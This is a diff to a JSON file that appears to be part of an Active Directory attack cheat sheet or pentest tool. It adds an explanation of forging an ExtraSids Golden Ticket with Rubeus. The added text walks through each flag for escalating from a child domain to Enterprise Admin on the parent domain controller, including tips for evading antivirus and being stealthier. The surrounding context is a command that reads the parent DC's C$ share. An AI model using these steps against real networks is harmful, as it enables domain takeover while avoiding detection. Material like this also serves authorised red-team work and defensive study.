@@ -108,5 +108,6 @@
       "label": "Access parent DC",
       "command": "dir \\\\<parent_dc>\\C$"
     }
-  ]
+  ],
+  "explain": "Forges the same ExtraSids Golden Ticket with Rubeus (more AV-evasive than Mimikatz):\n  golden                   forge a TGT offline\n  /rc4:<child_krbtgt_hash>  the child krbtgt NT hash (RC4 key) - use /aes256 to be stealthier\n  /domain:<child_domain> /sid:<child_sid>   the child domain and SID\n  /sids:<parent_EA_sid>    inject the parent EA SID into SID History (child->parent escalation)\n  /user:Administrator /ptt  impersonate Administrator and inject\nThe injected ticket grants EA-level access to the parent DC."
 }
